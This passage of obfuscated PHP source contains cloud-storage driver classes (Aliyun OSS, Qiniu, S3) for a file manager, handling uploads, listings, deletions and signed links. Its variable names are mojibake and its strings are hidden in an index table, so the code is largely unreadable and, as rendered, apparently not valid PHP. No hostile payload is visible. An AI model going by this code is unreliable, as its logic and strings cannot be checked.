$_SERVER[Á≈ ä ∞][1427] . $´‘ÿØøú); $˛ê€Ãâ = $this->link($”ïÖ˝ﬂà, $π‚–áÌ§); $this->fileOutLink($˛ê€Ãâ); } public function fileOutImageServer($›≤ïÊ‹û, $ËÔ°‰µŒ = 250) { parent::fileOutImage($›≤ïÊ‹û, $ËÔ°‰µŒ); } public function fileOutLink($Ô€∞Á„“) { $Ô÷‡œÑ√ =& $_SERVER[Á≈ ä ∞]; if (!$this->isCdnHost() && substr($Ô€∞Á„“, 0, 7) == $Ô÷‡œÑ√[1328]) { $Ô€∞Á„“ = $Ô÷‡œÑ√[1329] . substr($Ô€∞Á„“, 7); } header($Ô÷‡œÑ√[171] . $Ô€∞Á„“); die; } public function hashMd5($£˛íìûÍ, $È˘≤Å≈î = '') { $õÚÈ÷Öœ =& $_SERVER[Á≈ ä ∞]; $â¨Ë˙áﬂ = $this->_objectMeta($£˛íìûÍ); if (!$â¨Ë˙áﬂ) { return $õÚÈ÷Öœ[22]; } if (!isset($â¨Ë˙áﬂ[$õÚÈ÷Öœ[1402]]) && !empty($È˘≤Å≈î)) { $æãÊ€û≤ = $this->updateObjMeta($£˛íìûÍ, array($õÚÈ÷Öœ[1402] => $È˘≤Å≈î)); $â¨Ë˙áﬂ[$õÚÈ÷Öœ[1402]] = $æãÊ€û≤ ? $È˘≤Å≈î : $õÚÈ÷Öœ[22]; } return isset($â¨Ë˙áﬂ[$õÚÈ÷Öœ[1402]]) ? strtolower($â¨Ë˙áﬂ[$õÚÈ÷Öœ[1402]]) : $õÚÈ÷Öœ[22]; } public function size($í≠‘˛Øó) { $ûçƒ¡∑í = $this->objectMeta($í≠‘˛Øó); return $ûçƒ¡∑í ? $ûçƒ¡∑í[$_SERVER[Á≈ ä ∞][86]] : 0; } public function info($øÎÇÿ÷€) { if ($this->isFolder($øÎÇÿ÷€)) { return $this->folderInfo($øÎÇÿ÷€); } else { if ($this->isFile($øÎÇÿ÷€)) { return $this->fileInfo($øÎÇÿ÷€); } } return !1; } public function exist($µöüóí–) { return $this->isFile($µöüóí–) || $this->isFolder($µöüóí–); } public function isFile($º Òøø≥) { return !$this->isFolder($º Òøø≥) && $this->objectMeta($º Òøø≥); } public function isFolder($˙∫æêÀ€) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][175], $˙∫æêÀ€); } protected function objectMeta($Äˆ»•∞—) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][177], $Äˆ»•∞—); } protected function _objectMeta($£ÃÍÈìâ) { $ÈÀ£€¢ä =& $_SERVER[Á≈ ä ∞]; try { $™Öç´˙œ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($£ÃÍÈìâ)); } catch (OSS\Core\OssException $´˛∑ëÄ¨) { $™Öç´˙œ = !1; } if ($™Öç´˙œ) { $™Öç´˙œ[$ÈÀ£€¢ä[86]] = intval($™Öç´˙œ[$ÈÀ£€¢ä[1400]]); } return $™Öç´˙œ; } protected function _isFolder($ØáÃ˜Æ—) { $Ì©éÿÓ∆ =& $_SERVER[Á≈ ä ∞]; if ($ØáÃ˜Æ— == $Ì©éÿÓ∆[22] || $ØáÃ˜Æ— == $Ì©éÿÓ∆[18]) { return !0; } $õ†˛‚˚∫ = array($Ì©éÿÓ∆[1396] => $Ì©éÿÓ∆[18], $Ì©éÿÓ∆[1397] => rtrim($ØáÃ˜Æ—, $Ì©éÿÓ∆[18]) . $Ì©éÿÓ∆[18], $Ì©éÿÓ∆[1398] => 1, $Ì©éÿÓ∆[1399] => $Ì©éÿÓ∆[22]); $ÉÊÛ¯æ• = $this->client->listObjects($this->bucket, $õ†˛‚˚∫); if ($ÉÊÛ¯æ•->getObjectList() || $ÉÊÛ¯æ•->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($õƒﬂ„Ä´) { parent::__construct(); require_once SDK_DIR . $_SERVER[Á≈ ä ∞][1428]; $this->_init($õƒﬂ„Ä´); } public function _init($ë›Áﬁã⁄) { $ÎöÈÕ”ö =& $_SERVER[Á≈ ä ∞]; foreach ($ë›Áﬁã⁄ as $‰àÁ‘â¿ => $≥π»ö»«) { if (isset($this->{$‰àÁ‘â¿})) { $this->{$‰àÁ‘â¿} = $≥π»ö»«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÎöÈÕ”ö[1429] . LNG($ÎöÈÕ”ö[1387])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($»ùπß»–, $ﬁÅûœÌ = '', $”Å≤É≈º = REPEAT_RENAME) { if ($this->setContent($»ùπß»–, $ﬁÅûœÌ)) { return $this->getPathOuter($»ùπß»–); } return !1; } public function mkdir($Í—Ñÿ˝ó, $¢ƒîÀ∆ì = REPEAT_SKIP) { $¬—Ì´Üî =& $_SERVER[Á≈ ä ∞]; $À¡ﬁ◊´‰ = trim($Í—Ñÿ˝ó, $¬—Ì´Üî[18]); if ($this->_isFolder($À¡ﬁ◊´‰)) { return $this->getPathOuter($À¡ﬁ◊´‰); } $Í—Ñÿ˝ó = $À¡ﬁ◊´‰ . $¬—Ì´Üî[18]; $•  Èô˘ = get_path_this($À¡ﬁ◊´‰); $Áˆü‚‘¨ = $Í—Ñÿ˝ó . $•  Èô˘; if (!$this->mkfile($Áˆü‚‘¨)) { return !1; } if (!$this->moveFile($Áˆü‚‘¨, $Í—Ñÿ˝ó)) { $this->delFile($Áˆü‚‘¨); return !1; } return $this->getPathOuter($À¡ﬁ◊´‰); } public function copyFile($®¶∆ÈÇÕ, $è˛π™ì‘) { $æ©≠îòí = $this->bucketManager->copy($this->bucket, $®¶∆ÈÇÕ, $this->bucket, $è˛π™ì‘, !0); return $æ©≠îòí ? !1 : $this->getPathOuter($è˛π™ì‘); } public function moveFile($Ÿñ∑ΩŸ°, $¥Î∞â≥À) { $»∏ÜœÇ = $this->bucketManager->move($this->bucket, $Ÿñ∑ΩŸ°, $this->bucket, $¥Î∞â≥À, !0); return $»∏ÜœÇ ? !1 : $this->getPathOuter($¥Î∞â≥À); } public function delFile($¬π†åÄò) { if (!$this->exist($¬π†åÄò)) { return !0; } $òŒ∂©–ã = $this->bucketManager->delete($this->bucket, $¬π†åÄò); return $òŒ∂©–ã ? !1 : !0; } public function delFolder($„ë∂Ä≥›) { $à¸ºàÜ≈ =& $_SERVER[Á≈ ä ∞]; if (!$this->exist($„ë∂Ä≥›)) { return !0; } $this->listItemCache = !1; $ˆÌÌùÍ— = $this->fileList($„ë∂Ä≥›); $this->listItemCache = !0; $“—Ò◊áÇ = trim($„ë∂Ä≥›, $à¸ºàÜ≈[18]) . $à¸ºàÜ≈[18]; if (!empty($„ë∂Ä≥›) && $„ë∂Ä≥› !== $à¸ºàÜ≈[207] && !in_array($“—Ò◊áÇ, $ˆÌÌùÍ—[$à¸ºàÜ≈[92]])) { $ˆÌÌùÍ—[$à¸ºàÜ≈[92]][] = $“—Ò◊áÇ; } $≈®ä¿”ò = $this->delByBatch($ˆÌÌùÍ—[$à¸ºàÜ≈[93]]); if (!$≈®ä¿”ò) { return !1; } $≈®ä¿”ò = $this->delByBatch($ˆÌÌùÍ—[$à¸ºàÜ≈[92]]); if (!$≈®ä¿”ò) { return !1; } return $this->delFile($“—Ò◊áÇ); } private function delByBatch($áÔÀ˘ Ü) { foreach (array_chunk($áÔÀ˘ Ü, 1000) as $ÓõÎÌø£) { $≈Ó“âñ∫ = $this->bucketManager->buildBatchDelete($this->bucket, $ÓõÎÌø£); list($Ω⁄ŒìœÕ, $æ˙˙¡¯à) = $this->bucketManager->batch($≈Ó“âñ∫); if ($æ˙˙¡¯à) { return !1; } } return !0; } public function rename($ô¯ÂŒŒ˝, $≤Œï∂´Æ) { return $this->renameObject($ô¯ÂŒŒ˝, $≤Œï∂´Æ); } public function fileInfo($¶π”¥§Ë, $ÉÙõ€•˝ = false, $è¡Ä¢“í = array()) { $›¯≠Ï® =& $_SERVER[Á≈ ä ∞]; $Ì±Œ∫‰≥ = array($›¯≠Ï®[42] => $this->pathThis($¶π”¥§Ë), $›¯≠Ï®[94] => $this->getPathOuter($›¯≠Ï®[18] . $¶π”¥§Ë), $›¯≠Ï®[43] => $›¯≠Ï®[209], $›¯≠Ï®[86] => isset($è¡Ä¢“í[$›¯≠Ï®[1430]]) ? $è¡Ä¢“í[$›¯≠Ï®[1430]] : 0, $›¯≠Ï®[184] => $this->ext($¶π”¥§Ë)); if ($ÉÙõ€•˝) { return $Ì±Œ∫‰≥; } $Ì±Œ∫‰≥[$›¯≠Ï®[210]] = $Ì±Œ∫‰≥[$›¯≠Ï®[95]] = 0; $Ì±Œ∫‰≥[$›¯≠Ï®[211]] = $Ì±Œ∫‰≥[$›¯≠Ï®[212]] = !0; if (empty($è¡Ä¢“í)) { $è¡Ä¢“í = $this->objectMeta($¶π”¥§Ë); if (!$è¡Ä¢“í) { return $Ì±Œ∫‰≥; } } if (isset($è¡Ä¢“í[$›¯≠Ï®[1431]])) { $Ì±Œ∫‰≥[$›¯≠Ï®[95]] = substr($è¡Ä¢“í[$›¯≠Ï®[1431]] . $›¯≠Ï®[22], 0, 10); } if (isset($è¡Ä¢“í[$›¯≠Ï®[1430]])) { $Ì±Œ∫‰≥[$›¯≠Ï®[86]] = $è¡Ä¢“í[$›¯≠Ï®[1430]]; } return $Ì±Œ∫‰≥; } public function folderInfo($¯∆Öç«¯, $Ì¬ÈÌ»ò = false) { $„íéÀ¢ò =& $_SERVER[Á≈ ä ∞]; $Ó”¯ÀπÉ = array($„íéÀ¢ò[42] => $this->pathThis($¯∆Öç«¯), $„íéÀ¢ò[94] => $this->getPathOuter($„íéÀ¢ò[18] . $¯∆Öç«¯), $„íéÀ¢ò[43] => $„íéÀ¢ò[85]); if ($Ì¬ÈÌ»ò) { return $Ó”¯ÀπÉ; } $Ó”¯ÀπÉ[$„íéÀ¢ò[210]] = $Ó”¯ÀπÉ[$„íéÀ¢ò[95]] = 0; $Ó”¯ÀπÉ[$„íéÀ¢ò[211]] = $Ó”¯ÀπÉ[$„íéÀ¢ò[212]] = !0; $¯∆Öç«¯ = rtrim($¯∆Öç«¯, $„íéÀ¢ò[18]) . $„íéÀ¢ò[18]; $Çü™ΩˆÄ = $this->objectMeta($¯∆Öç«¯); if (isset($Çü™ΩˆÄ[$„íéÀ¢ò[1431]])) { $Ó”¯ÀπÉ[$„íéÀ¢ò[95]] = substr($Çü™ΩˆÄ[$„íéÀ¢ò[1431]] . $„íéÀ¢ò[22], 0, 10); } return $Ó”¯ÀπÉ; } public function listPath($¯Ë¥á—™, $∏úêÕ◊Á = false) { $”«‹õ‘é =& $_SERVER[Á≈ ä ∞]; $Û„»∏Ô’ = $this->fileList($¯Ë¥á—™, $”«‹õ‘é[18], !0); foreach ($Û„»∏Ô’[$”«‹õ‘é[92]] as $≤¢Ø¿£¢ => $ÓÓ÷ÙÅÓ) { $Û„»∏Ô’[$”«‹õ‘é[92]][$≤¢Ø¿£¢] = $this->folderInfo($ÓÓ÷ÙÅÓ, $∏úêÕ◊Á); } foreach ($Û„»∏Ô’[$”«‹õ‘é[93]] as $≤¢Ø¿£¢ => $ÓÓ÷ÙÅÓ) { $Û„»∏Ô’[$”«‹õ‘é[93]][$≤¢Ø¿£¢] = $this->fileInfo($ÓÓ÷ÙÅÓ[$”«‹õ‘é[104]], $∏úêÕ◊Á, $ÓÓ÷ÙÅÓ); } return $Û„»∏Ô’; } public function has($·ΩÄùº√, $∑¡ïÅå¥ = false, $Åæê√ü‡ = true) { $Ù÷‘˚ôõ =& $_SERVER[Á≈ ä ∞]; $·ΩÄùº√ = trim($·ΩÄùº√, $Ù÷‘˚ôõ[18]); $Ü©˜ê√À = empty($·ΩÄùº√) && $·ΩÄùº√ !== $Ù÷‘˚ôõ[207] ? $Ù÷‘˚ôõ[22] : $·ΩÄùº√ . $Ù÷‘˚ôõ[18]; $§ìÆ€†ﬁ = $Ù÷‘˚ôõ[22]; $⁄Óò∆ÒÎ = 500; $ÀÍÙ˝ß  = $Ù÷‘˚ôõ[18]; $ç∆õ±Ôí = $ˆ®üû√Û = 0; while (!0) { check_abort(); list($˙¶‹áå≠, $öõßœ⁄∆) = $this->bucketManager->listFiles($this->bucket, $Ü©˜ê√À, $§ìÆ€†ﬁ, $⁄Óò∆ÒÎ, $ÀÍÙ˝ß ); if ($öõßœ⁄∆) { break; } $§ìÆ€†ﬁ = array_key_exists($Ù÷‘˚ôõ[1399], $˙¶‹áå≠) ? $§ìÆ€†ﬁ = $˙¶‹áå≠[$Ù÷‘˚ôõ[1432]] : $Ù÷‘˚ôõ[22]; if ($∑¡ïÅå¥) { if (!empty($˙¶‹áå≠[$Ù÷‘˚ôõ[1433]])) { $ç∆õ±Ôí += count($˙¶‹áå≠[$Ù÷‘˚ôõ[1433]]); } if (!empty($˙¶‹áå≠[$Ù÷‘˚ôõ[1434]])) { $ˆ®üû√Û += count($˙¶‹áå≠[$Ù÷‘˚ôõ[1434]]); } if ($§ìÆ€†ﬁ === $Ù÷‘˚ôõ[22]) { break; } continue; } if ($Åæê√ü‡) { if (!empty($˙¶‹áå≠[$Ù÷‘˚ôõ[1433]])) { return !0; } } else { if (!empty($˙¶‹áå≠[$Ù÷‘˚ôõ[1434]])) { return !0; } } if ($§ìÆ€†ﬁ === $Ù÷‘˚ôõ[22]) { break; } } if ($∑¡ïÅå¥) { return array($Ù÷‘˚ôõ[217] => $ç∆õ±Ôí, $Ù÷‘˚ôõ[218] => $ˆ®üû√Û); } return !1; } public function listAll($±±…Ã≥å) { $ÃÜ©÷ƒÿ =& $_SERVER[Á≈ ä ∞]; $õÖ∞˚œÂ = $this->fileList($±±…Ã≥å, $ÃÜ©÷ƒÿ[22], !0); $∆“£±â¯ = array(); foreach ($õÖ∞˚œÂ[$ÃÜ©÷ƒÿ[93]] as $“ã∑’ÈÆ) { $∆“£±â¯[$“ã∑’ÈÆ[$ÃÜ©÷ƒÿ[104]]] = $“ã∑’ÈÆ[$ÃÜ©÷ƒÿ[86]]; } foreach ($õÖ∞˚œÂ[$ÃÜ©÷ƒÿ[92]] as $“ã∑’ÈÆ) { if (is_string($“ã∑’ÈÆ)) { $∆“£±â¯[$“ã∑’ÈÆ] = 0; } } return $this->listAllFiles($±±…Ã≥å, array_keys($∆“£±â¯), $∆“£±â¯); } private function fileList($¥Ñ ›èï, $Øœâïâ = '', $≠®Ú¢Õ– = 0) { $îµ„∂ŒÎ =& $_SERVER[Á≈ ä ∞]; $¥Ñ ›èï = trim($¥Ñ ›èï, $îµ„∂ŒÎ[18]); $˜åΩã’ö = empty($¥Ñ ›èï) && $¥Ñ ›èï !== $îµ„∂ŒÎ[207] ? $îµ„∂ŒÎ[22] : $¥Ñ ›èï . $îµ„∂ŒÎ[18]; $·ÄöÓÀÛ = $îµ„∂ŒÎ[22]; $Ïâñ€öá = 1000; $◊¥±ª˜Õ = $°“Ä·¢û = array(); while (!0) { check_abort(); list($ÕƒÇõô€, $¸»ôáüé) = $this->bucketManager->listFiles($this->bucket, $˜åΩã’ö, $·ÄöÓÀÛ, $Ïâñ€öá, $Øœâïâ); if ($¸»ôáüé) { break; } $·ÄöÓÀÛ = array_key_exists($îµ„∂ŒÎ[1399], $ÕƒÇõô€) ? $·ÄöÓÀÛ = $ÕƒÇõô€[$îµ„∂ŒÎ[1432]] : $îµ„∂ŒÎ[22]; $Ç›‹ú«≈ = isset($ÕƒÇõô€[$îµ„∂ŒÎ[1433]]) ? $ÕƒÇõô€[$îµ„∂ŒÎ[1433]] : array(); $í∑±Õ¬π = isset($ÕƒÇõô€[$îµ„∂ŒÎ[1434]]) ? $ÕƒÇõô€[$îµ„∂ŒÎ[1434]] : array(); foreach ($Ç›‹ú«≈ as $ƒœ˛—æ˝) { if ($ƒœ˛—æ˝[$îµ„∂ŒÎ[104]] == $˜åΩã’ö) { continue; } $¸∂ö™Ã„ = $ƒœ˛—æ˝[$îµ„∂ŒÎ[104]]; $Œñµ§ØÜ = $ƒœ˛—æ˝[$îµ„∂ŒÎ[1430]]; $ƒœ˛—æ˝[$îµ„∂ŒÎ[86]] = $Œñµ§ØÜ; $üë Ç÷Ê = $Œñµ§ØÜ == 0 && substr($¸∂ö™Ã„, strlen($¸∂ö™Ã„) - 1, 1) == $îµ„∂ŒÎ[18] ? !0 : !1; $this->cacheMethodInfoSet($¸∂ö™Ã„, $üë Ç÷Ê, $ƒœ˛—æ˝); if ($üë Ç÷Ê) { $◊¥±ª˜Õ[] = $¸∂ö™Ã„; continue; } $°“Ä·¢û[] = $≠®Ú¢Õ– ? $ƒœ˛—æ˝ : $¸∂ö™Ã„; } foreach ($í∑±Õ¬π as $¸∂ö™Ã„) { if ($¸∂ö™Ã„ == $˜åΩã’ö) { continue; } $◊¥±ª˜Õ[] = $¸∂ö™Ã„; $this->cacheMethodInfoSet($¸∂ö™Ã„, !0); } if ($·ÄöÓÀÛ === $îµ„∂ŒÎ[22]) { break; } } $this->cacheMethodInfoSet($¥Ñ ›èï, !0); return array($îµ„∂ŒÎ[92] => $◊¥±ª˜Õ, $îµ„∂ŒÎ[93] => $°“Ä·¢û); } public function canRead($˛˛Ì§√) { return $this->exist($˛˛Ì§√) ? !0 : !1; } public function canWrite($÷Ñﬁ©ç¢) { return $this->exist($÷Ñﬁ©ç¢) ? !0 : !1; } public function getContent($§Èõã≈) { return $this->fileSubstr($§Èõã≈, 0, -1); } public function setContent($≠ÿöæøÄ, $¿˝™≥Î‚ = '') { $Äûò–—∑ = $this->tempFile($this->pathThis($≠ÿöæøÄ)); file_put_contents($Äûò–—∑, $¿˝™≥Î‚); if ($this->upload($≠ÿöæøÄ, $Äûò–—∑)) { $this->tempFileRemve($Äûò–—∑); return !0; } return !1; } public function refreshUrls($ÔÑÕ®¯Æ) { $ÿÙ…„√‹ =& $_SERVER[Á≈ ä ∞]; $ºœÈö§é = array(); if (is_array($ÔÑÕ®¯Æ)) { foreach ($ÔÑÕ®¯Æ as $ÍÆîı∞ﬁ) { $ºœÈö§é[] = $this->link($ÍÆîı∞ﬁ); } } else { $ºœÈö§é[] = $this->link($ÔÑÕ®¯Æ); } $≈≠˛˜”Õ = new Qiniu\Cdn\CdnManager($this->auth); list($˚ •∫ûé, $—Ï’†ü„) = $≈≠˛˜”Õ->refreshUrls($ºœÈö§é); if ($—Ï’†ü„) { return !1; } return $˚ •∫ûé[$ÿÙ…„√‹[1186]] == $ÿÙ…„√‹[767] ? !0 : !1; } public function fileSubstr($ê±Ö¸≥¥, $ñå€‘åÇ, $Ú˙”≈¿) { $√ÆÉØƒÙ =& $_SERVER[Á≈ ä ∞]; if (!($¢äè√üâ = $this->link($ê±Ö¸≥¥))) { return !1; } $áÓ¬‚ˆÄ = !1; if ($Ú˙”≈¿ > 0) { $âƒı¶ß∫ = $ñå€‘åÇ + $Ú˙”≈¿ - 1; $áÓ¬‚ˆÄ = array($√ÆÉØƒÙ[1435] . $ñå€‘åÇ . $√ÆÉØƒÙ[395] . $âƒı¶ß∫); } $ÒßÂﬁ±¯ = url_request($¢äè√üâ, $√ÆÉØƒÙ[240], !1, $áÓ¬‚ˆÄ); return $ÒßÂﬁ±¯[$√ÆÉØƒÙ[757]] ? $ÒßÂﬁ±¯[$√ÆÉØƒÙ[1196]] : !1; } public function upload($¢»ùÜíå, $ˆä±Ñ∂ÿ, $◊é´™â = false, $üµÄÜ€ê = REPEAT_REPLACE) { $óÅ¯Ùàó = new Qiniu\Storage\UploadManager(); $õÈÂ‘ì = $this->auth->uploadToken($this->bucket, $¢»ùÜíå); $¶¬≥•†© = get_file_mime(get_path_ext($ˆä±Ñ∂ÿ)); list($ˆƒÔ·ºö, $‚ö…’¡Á) = $óÅ¯Ùàó->putFile($õÈÂ‘ì, $¢»ùÜíå, $ˆä±Ñ∂ÿ, null, $¶¬≥•†©); return $‚ö…’¡Á ? !1 : $this->getPathOuter($¢»ùÜíå); } public function uploadFormData($àˆÖèœ, $Å⁄»˘¬Ã = 3600) { return $this->uploadToken($àˆÖèœ, $Å⁄»˘¬Ã); } public function multiUploadFormData($π∆é¿◊∂, $Ï…‘Ì‘– = 3600) { return $this->uploadToken($π∆é¿◊∂, $Ï…‘Ì‘–); } private function uploadToken($ëÒ‡≈ÃŸ, $î˚˘çº› = 3600) { $˘∂‚œîÃ =& $_SERVER[Á≈ ä ∞]; $ïâ·ç≠ = $î˚˘çº›; $€‰∂ÀÎ⁄ = array($˘∂‚œîÃ[1436] => $˘∂‚œîÃ[1437]); $Ö‘õ“È = $ëÒ‡≈ÃŸ; $ƒ¸ÿÇÅ´ = $this->auth->uploadToken($this->bucket, $Ö‘õ“È, $ïâ·ç≠, $€‰∂ÀÎ⁄, !0); $∂ç˝–∏î = empty($this->region) || $this->region == $˘∂‚œîÃ[1438] ? $˘∂‚œîÃ[22] : $˘∂‚œîÃ[395] . $this->region; $˝©ìÌÎ˘ = http_type() . "\x3a\x2f\57\x75\x70\x6c\x6f\x61\144{$∂ç˝–∏î}\x2e\161\151\x6e\151\x75\x70\x2e\143\157\155\x2f"; return array($˘∂‚œîÃ[1439] => $ƒ¸ÿÇÅ´, $˘∂‚œîÃ[1440] => $˝©ìÌÎ˘); } public function download($·®ëÏóÁ, $ñ©’©ñü) { $ç‡ÄÀ„Ú = IO::getPathInner(IO::mkfile($ñ©’©ñü)); if (!($î¥∫ú˚„ = $this->link($·®ëÏóÁ))) { return !1; } $≠ÍÎÖ˘ﬁ = 0; $…—≠§íé = 1024 * 200; $ºäóÁ∂› = fopen($ç‡ÄÀ„Ú, $_SERVER[Á≈ ä ∞][1441]); while (!0) { $±≈π∏Û‰ = $this->fileSubstr($·®ëÏóÁ, $≠ÍÎÖ˘ﬁ, $…—≠§íé); if ($±≈π∏Û‰ === !1) { return !1; } fwrite($ºäóÁ∂›, $±≈π∏Û‰); $≠ÍÎÖ˘ﬁ += $…—≠§íé; if (strlen($±≈π∏Û‰) < $…—≠§íé) { break; } } fclose($ºäóÁ∂›); return $ñ©’©ñü; } public function link($˘∏ªÛ“, $ﬂÅÅó‚⁄ = '') { if (!$this->isFile($˘∏ªÛ“)) { return !1; } $†Ç§¶¸¢ = $this->getHost() . $_SERVER[Á≈ ä ∞][18] . $this->pathEncode($˘∏ªÛ“) . $ﬂÅÅó‚⁄; return $this->auth->privateDownloadUrl($†Ç§¶¸¢, 3600 * 12); } public function fileOut($‘‡≥øÎç, $±Îè∂∆ù = false, $…˚ÀÀΩ£ = false, $⁄⁄¨§ÅÅ = '') { $ÖÊØ’Àæ =& $_SERVER[Á≈ ä ∞]; if ($this->isFileOutServer()) { return $this->fileOutServer($‘‡≥øÎç, $±Îè∂∆ù, $…˚ÀÀΩ£, $⁄⁄¨§ÅÅ); } if (!$…˚ÀÀΩ£) { $…˚ÀÀΩ£ = $this->pathThis($‘‡≥øÎç); } $ë éºÄ  = $±Îè∂∆ù ? $ÖÊØ’Àæ[1442] . rawurlencode($…˚ÀÀΩ£) : $ÖÊØ’Àæ[22]; $∞æı∫√á = $this->link($‘‡≥øÎç, $ë éºÄ ); $this->fileOutLink($∞æı∫√á); } public function fileOutServer($º±·˘“˛, $∆¢ò™≥Ì = false, $îÖ∆õ÷◊ = false, $ﬂßú©ò√ = '') { parent::fileOut($º±·˘“˛, $∆¢ò™≥Ì, $îÖ∆õ÷◊, $ﬂßú©ò√); } public function fileOutImage($©èÄ†ÓÎ, $æÕÍâç¬ = 250) { $Œõû„’‘ = $this->link($©èÄ†ÓÎ, $_SERVER[Á≈ ä ∞][1443] . $æÕÍâç¬); $this->fileOutLink($Œõû„’‘); } public function fileOutImageServer($†£Òó≤¯, $ãè¢º˛¯ = 250) { parent::fileOutImage($†£Òó≤¯, $ãè¢º˛¯); } public function hashMd5($˝◊ÓÿµÓ) { $≤ãû–èŸ =& $_SERVER[Á≈ ä ∞]; $Õ–’≤°ï = $this->objectMeta($˝◊ÓÿµÓ); return isset($Õ–’≤°ï[$≤ãû–èŸ[222]]) ? $Õ–’≤°ï[$≤ãû–èŸ[222]] : !1; $Çú•ﬁ”Ÿ = $this->link($˝◊ÓÿµÓ, $≤ãû–èŸ[1444]); } public function size($Ä¢÷¥”ã) { $œªÖïåÑ = $this->objectMeta($Ä¢÷¥”ã); return $œªÖïåÑ ? $œªÖïåÑ[$_SERVER[Á≈ ä ∞][86]] : 0; } public function info($éÁ£“Óë) { if ($this->isFolder($éÁ£“Óë)) { return $this->folderInfo($éÁ£“Óë); } else { if ($this->isFile($éÁ£“Óë)) { return $this->fileInfo($éÁ£“Óë); } } return !1; } public function exist($Äõ√ ﬂÂ) { return $this->isFile($Äõ√ ﬂÂ) || $this->isFolder($Äõ√ ﬂÂ); } public function isFile($¬Ï∂Ó˝í) { return !$this->isFolder($¬Ï∂Ó˝í) && $this->objectMeta($¬Ï∂Ó˝í); } public function isFolder($∞Ïãù≠Ú) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][175], $∞Ïãù≠Ú); } protected function objectMeta($√⁄”®ù√) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][177], $√⁄”®ù√); } protected function _objectMeta($Ô¥Ç∂øﬂ) { $Ãø˜ëµø =& $_SERVER[Á≈ ä ∞]; list($´Æê‰ÙÃ, $ﬁß¢€Àô) = $this->bucketManager->stat($this->bucket, $Ô¥Ç∂øﬂ); if ($´Æê‰ÙÃ) { $´Æê‰ÙÃ[$Ãø˜ëµø[86]] = intval($´Æê‰ÙÃ[$Ãø˜ëµø[1430]]); } return $´Æê‰ÙÃ; } protected function _isFolder($»•»ëÖÖ) { $ˆ¡€ıÓî =& $_SERVER[Á≈ ä ∞]; if ($»•»ëÖÖ == $ˆ¡€ıÓî[22] || $»•»ëÖÖ == $ˆ¡€ıÓî[18]) { return !0; } list($„ÁõÈ∏‰, $Ø≠óÜâó) = $this->bucketManager->listFiles($this->bucket, trim($»•»ëÖÖ, $ˆ¡€ıÓî[18]) . $ˆ¡€ıÓî[18], $ˆ¡€ıÓî[22], 1, $ˆ¡€ıÓî[18]); return !empty($„ÁõÈ∏‰[$ˆ¡€ıÓî[1433]]) || !empty($„ÁõÈ∏‰[$ˆ¡€ıÓî[1434]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($˛õòŸ∞≥) { parent::__construct($˛õòŸ∞≥); } public function uploadFormData($ó˛ÊçÛ±, $åÖã»≈ï = 3600) { $˚üˆà•ï =& $_SERVER[Á≈ ä ∞]; $ø˚√ÙõÁ = $˚üˆà•ï[208]; $∑ÿ€öÉƒ = $˚üˆà•ï[1349]; $ºø‡≥Ñ = $˚üˆà•ï[72]; $ﬁ˚ìé⁄â = gmdate($˚üˆà•ï[1350]); $Ø¡π“™· = gmdate($˚üˆà•ï[758]); $ü≈Óø¥ù = $˚üˆà•ï[1351]; $‰ùƒ†∫¶ = $åÖã»≈ï . $˚üˆà•ï[22]; $Ü¶Ü¯óò = $˚üˆà•ï[1313]; $¬…◊¬•ô = array($this->accessKey, $Ø¡π“™·, $this->region, $ºø‡≥Ñ, $ü≈Óø¥ù); $¶Ïƒ˚Ü∆ = implode($˚üˆà•ï[18], $¬…◊¬•ô); $ùÒ≈»ıç = array($˚üˆà•ï[1315] => gmdate($˚üˆà•ï[1314], strtotime($˚üˆà•ï[1352])), $˚üˆà•ï[1316] => array(array($˚üˆà•ï[1318] => $this->bucket), array($˚üˆà•ï[1317] => $ø˚√ÙõÁ), array($˚üˆà•ï[1319], $˚üˆà•ï[1320], $˚üˆà•ï[22]), array($˚üˆà•ï[1319], $˚üˆà•ï[1353], $˚üˆà•ï[22]), array($˚üˆà•ï[1319], $˚üˆà•ï[1354], $˚üˆà•ï[22]), array($˚üˆà•ï[1321] => $Ü¶Ü¯óò), array($˚üˆà•ï[1355] => $¶Ïƒ˚Ü∆), array($˚üˆà•ï[1356] => $∑ÿ€öÉƒ), array($˚üˆà•ï[1357] => $ﬁ˚ìé⁄â), array($˚üˆà•ï[1358] => $‰ùƒ†∫¶))); $©˝ÈŸ˘˜ = base64_encode(json_encode($ùÒ≈»ıç)); $Ü†ü∫ˆ“ = hash_hmac($˚üˆà•ï[1359], $Ø¡π“™·, $˚üˆà•ï[1360] . $this->secret, !0); $Œú¬Í∂ = hash_hmac($˚üˆà•ï[1359], $this->region, $Ü†ü∫ˆ“, !0); $ò◊˙ß¥Â = hash_hmac($˚üˆà•ï[1359], $ºø‡≥Ñ, $Œú¬Í∂, !0); $◊∞Ä˛‰Í = hash_hmac($˚üˆà•ï[1359], $ü≈Óø¥ù, $ò◊˙ß¥Â, !0); $—≠®¡ñ˘ = hash_hmac($˚üˆà•ï[1359], $©˝ÈŸ˘˜, $◊∞Ä˛‰Í); $…á◊’„π = array($˚üˆà•ï[225] => $˚üˆà•ï[22], $˚üˆà•ï[1361] => $˚üˆà•ï[22], $˚üˆà•ï[1317] => $ø˚√ÙõÁ, $˚üˆà•ï[1321] => $Ü¶Ü¯óò, $˚üˆà•ï[1325] => $©˝ÈŸ˘˜, $˚üˆà•ï[1362] => $¶Ïƒ˚Ü∆, $˚üˆà•ï[1363] => $∑ÿ€öÉƒ, $˚üˆà•ï[1364] => $ﬁ˚ìé⁄â, $˚üˆà•ï[1365] => $‰ùƒ†∫¶, $˚üˆà•ï[1366] 